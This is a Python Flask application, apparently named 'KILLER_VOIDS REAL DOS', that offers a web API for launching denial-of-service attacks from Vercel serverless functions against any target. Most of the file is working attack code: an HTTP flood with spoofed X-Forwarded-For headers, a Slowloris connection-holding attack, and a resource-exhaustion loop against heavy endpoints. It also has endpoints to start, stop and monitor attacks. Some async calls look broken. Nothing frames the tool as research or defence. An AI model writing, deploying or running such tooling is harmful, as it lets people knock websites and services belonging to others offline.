#!/usr/bin/env python3
"""
KILLER_VOIDS REAL DOS - VERCEL VERSION
Bisa jalan 100% di Vercel Serverless
"""

import asyncio
import aiohttp
import socket
import time
import random
import threading
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os

app = Flask(__name__)
CORS(app)

# === REAL DOS METHODS YANG WORK DI VERCEL ===
class VercelDOS:
    def __init__(self):
        self.active_attacks = {}
        self.max_concurrent = 50  # Vercel limit
        
    async def http_flood_async(self, target_url, duration=60, rate=100):
        """
        REAL HTTP FLOOD - Async version untuk Vercel
        Rate: requests per second
        """
        attack_id = random.randint(10000, 99999)
        self.active_attacks[attack_id] = {
            'status': 'running',
            'start_time': datetime.now(),
            'requests_sent': 0,
            'target': target_url
        }
        
        async def send_request(session):
            """Send single HTTP request"""
            try:
                headers = {
                    'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500, 600)}.{random.randint(30, 40)}',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'max-age=0',
                    'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
                }
                
                # Add random parameters
                params = {
                    'rand': random.randint(100000, 999999),
                    't': int(time.time()),
                    'cache': random.randint(1000, 9999)
                }
                
                async with session.get(target_url, headers=headers, params=params, timeout=5) as response:
                    return response.status
            except Exception as e:
                return str(e)
        
        async def flood():
            """Main flood function"""
            start_time = time.time()
            connector = aiohttp.TCPConnector(limit=0)  # No connection limit
            
            async with aiohttp.ClientSession(connector=connector) as session:
                while time.time() - start_time < duration and self.active_attacks[attack_id]['status'] == 'running':
                    tasks = []
                    
                    # Create batch of requests
                    for _ in range(min(rate, self.max_concurrent)):
                        tasks.append(send_request(session))
                    
                    # Execute batch
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Update counter
                    self.active_attacks[attack_id]['requests_sent'] += len(tasks)
                    
                    # Wait to maintain rate
                    await asyncio.sleep(1)
            
            # Cleanup
            self.active_attacks[attack_id]['status'] = 'completed'
            self.active_attacks[attack_id]['end_time'] = datetime.now()
            
            return attack_id
        
        # Run in background
        asyncio.create_task(flood())
        return attack_id
    
    def slowloris_vercel(self, target_host, target_port=80, sockets=100):
        """
        SLOWLORIS versi Vercel - Limited tapi work
        """
        attack_id = random.randint(20000, 29999)
        
        def slowloris_thread():
            """Slowloris implementation untuk Vercel"""
            sock_list = []
            target_ip = socket.gethostbyname(target_host)
            
            try:
                # Create initial sockets
                for i in range(min(sockets, 50)):  # Limit untuk Vercel
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(3)
                        sock.connect((target_ip, target_port))
                        
                        # Send partial HTTP request
                        sock.send(f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n".encode())
                        sock.send(f"Host: {target_host}\r\n".encode())
                        sock.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
                        sock.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
                        
                        sock_list.append(sock)
                    except:
                        continue
                
                # Keep connections alive
                start_time = time.time()
                while time.time() - start_time < 300:  # Max 5 minutes untuk Vercel
                    for sock in sock_list[:]:
                        try:
                            # Send keep-alive headers
                            sock.send(f"X-{random.randint(1000, 9999)}: {random.randint(1000, 9999)}\r\n".encode())
                        except:
                            try:
                                sock.close()
                                sock_list.remove(sock)
                            except:
                                pass
                    
                    # Replenish sockets
                    while len(sock_list) < min(sockets, 50):
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(3)
                            sock.connect((target_ip, target_port))
                            sock.send(f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n".encode())
                            sock_list.append(sock)
                        except:
                            break
                    
                    time.sleep(15)  # Keep-alive interval
                
            finally:
                # Cleanup
                for sock in sock_list:
                    try:
                        sock.close()
                    except:
                        pass
            
            self.active_attacks[attack_id]['status'] = 'completed'
        
        self.active_attacks[attack_id] = {
            'status': 'running',
            'start_time': datetime.now(),
            'target': f"{target_host}:{target_port}",
            'type': 'slowloris'
        }
        
        # Start thread
        thread = threading.Thread(target=slowloris_thread)
        thread.daemon = True
        thread.start()
        
        return attack_id
    
    def resource_exhaustion(self, target_url):
        """
        Resource Exhaustion Attack
        Request resource-heavy pages repeatedly
        """
        attack_id = random.randint(30000, 39999)
        
        async def exhaust():
            heavy_endpoints = [
                f"{target_url}/search?q={'x'*1000}",
                f"{target_url}/api/data?size=10000",
                f"{target_url}/download?file=large",
                f"{target_url}/report?format=pdf&pages=100"
            ]
            
            async with aiohttp.ClientSession() as session:
                while self.active_attacks[attack_id]['status'] == 'running':
                    tasks = []
                    for url in heavy_endpoints:
                        for _ in range(5):
                            tasks.append(session.get(url, timeout=30))
                    
                    await asyncio.gather(*tasks, return_exceptions=True)
                    self.active_attacks[attack_id]['requests_sent'] += len(tasks)
                    await asyncio.sleep(0.5)
        
        self.active_attacks[attack_id] = {
            'status': 'running',
            'start_time': datetime.now(),
            'target': target_url,
            'type': 'resource_exhaustion',
            'requests_sent': 0
        }
        
        asyncio.create_task(exhaust())
        return attack_id

# === FLASK ROUTES ===
dos_attacker = VercelDOS()

@app.route('/api/dos/start', methods=['POST'])
def start_dos():
    """
    Start REAL DOS attack
    """
    try:
        data = request.json
        target = data.get('target', '').strip()
        method = data.get('method', 'http_flood')
        duration = int(data.get('duration', 60))
        intensity = int(data.get('intensity', 50))
        
        if not target:
            return jsonify({'success': False, 'message': 'Target required'})
        
        # Add protocol jika tidak ada
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        attack_id = None
        
        if method == 'http_flood':
            # Convert duration to seconds (max 120 detik untuk Vercel)
            duration = min(duration, 120)
            intensity = min(intensity, 50)  # Max 50 concurrent
            
            # Run async
            attack_id = asyncio.run(dos_attacker.http_flood_async(target, duration, intensity))
            
        elif method == 'slowloris':
            # Parse host and port
            target = target.replace('http://', '').replace('https://', '').split('/')[0]
            if ':' in target:
                host, port = target.split(':')
                port = int(port)
            else:
                host = target
                port = 80
            
            sockets = min(intensity, 50)
            attack_id = dos_attacker.slowloris_vercel(host, port, sockets)
            
        elif method == 'resource':
            attack_id = dos_attacker.resource_exhaustion(target)
        
        if attack_id:
            return jsonify({
                'success': True,
                'message': 'DOS attack started',
                'attack_id': attack_id,
                'method': method,
                'target': target,
                'start_time': datetime.now().isoformat()
            })
        else:
            return jsonify({'success': False, 'message': 'Failed to start attack'})
            
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error: {str(e)}'})

@app.route('/api/dos/stop/<attack_id>', methods=['POST'])
def stop_dos(attack_id):
    """
    Stop attack
    """
    try:
        attack_id = int(attack_id)
        if attack_id in dos_attacker.active_attacks:
            dos_attacker.active_attacks[attack_id]['status'] = 'stopped'
            return jsonify({'success': True, 'message': 'Attack stopped'})
        return jsonify({'success': False, 'message': 'Attack not found'})
    except:
        return jsonify({'success': False, 'message': 'Invalid attack ID'})

@app.route('/api/dos/status/<attack_id>')
def dos_status(attack_id):
    """
    Get attack status
    """
    try:
        attack_id = int(attack_id)
        if attack_id in dos_attacker.active_attacks:
            attack = dos_attacker.active_attacks[attack_id]
            
            # Calculate runtime
            if 'start_time' in attack:
                runtime = (datetime.now() - attack['start_time']).total_seconds()
                attack['runtime'] = runtime
            
            return jsonify({'success': True, 'attack': attack})
        return jsonify({'success': False, 'message': 'Attack not found'})
    except:
        return jsonify({'success': False, 'message': 'Invalid attack ID'})

@app.route('/api/dos/resolve', methods=['POST'])
def resolve_target():
    """
    Resolve domain to IP
    """
    try:
        data = request.json
        target = data.get('target', '').strip()
        
        # Clean URL
        if 'http://' in target:
            target = target.replace('http://', '')
        elif 'https://' in target:
            target = target.replace('https://', '')
        
        if '/' in target:
            target = target.split('/')[0]
        
        # Resolve DNS
        ip = socket.gethostbyname(target)
        
        return jsonify({
            'success': True,
            'domain': target,
            'ip': ip,
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({'success': False, 'message': f'DNS resolve failed: {str(e)}'})

@app.route('/api/dos/methods')
def get_methods():
    """
    Get available DOS methods
    """
    methods = [
        {'id': 'http_flood', 'name': 'HTTP Flood', 'desc': 'High-rate HTTP requests'},
        {'id': 'slowloris', 'name': 'Slowloris', 'desc': 'Partial connection attack'},
        {'id': 'resource', 'name': 'Resource Exhaustion', 'desc': 'Request heavy resources'}
    ]
    return jsonify({'success': True, 'methods': methods})

# Health check
@app.route('/api/health')
def health():
    return jsonify({
        'status': 'online',
        'service': 'KILLER_VOIDS DOS',
        'attacks_active': len([a for a in dos_attacker.active_attacks.values() if a['status'] == 'running']),
        'timestamp': datetime.now().isoformat()
    })

# Run server
if __name__ == '__main__':
    app.run(debug=True, port=5000)